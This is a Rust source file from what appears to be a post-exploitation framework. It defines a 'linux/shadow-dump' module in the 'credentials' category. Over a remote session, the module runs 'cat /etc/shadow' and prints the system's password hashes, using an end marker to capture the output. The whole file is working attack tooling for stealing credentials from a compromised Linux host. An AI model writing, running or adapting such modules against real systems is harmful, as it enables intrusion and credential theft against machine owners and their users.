use crate::core::modules::Module;
use crate::core::loghandler::LogHandler;
use crate::cli::output::send_command_and_get_output_until;

pub struct ShadowDumpLinux;

impl Module for ShadowDumpLinux {
    fn name(&self) -> &'static str { "linux/shadow-dump" }
    fn description(&self) -> &'static str { "Dump /etc/shadow (root required)" }
    fn usage(&self) -> &'static str { "Usage: run-module linux/shadow-dump <session_id>" }
    fn platform(&self) -> &'static str { "linux" }
    fn category(&self) -> &'static str { "credentials" }
    fn run(&self, session_id: usize, session_manager: &crate::core::session::SessionManager, _args: Vec<String>) {
        if let Some(session) = session_manager.get(session_id) {
            let marker = "__AEGIS_END__";
            let cmd = format!("cat /etc/shadow; echo {}\n", marker);
            match send_command_and_get_output_until(&session, &cmd, marker) {
                Ok(data) => {
                    if let Some(idx) = data.windows(marker.len()).rposition(|window| window == marker.as_bytes()) {
                        let output = &data[..idx];
                        println!("{}", String::from_utf8_lossy(output));
                        LogHandler::success("Dumped /etc/shadow.");
                    } else {
                        LogHandler::error("End marker not found in output.");
                    }
                }
                Err(e) => LogHandler::error(&format!("Failed to dump /etc/shadow: {}", e)),
            }
        }
    }
}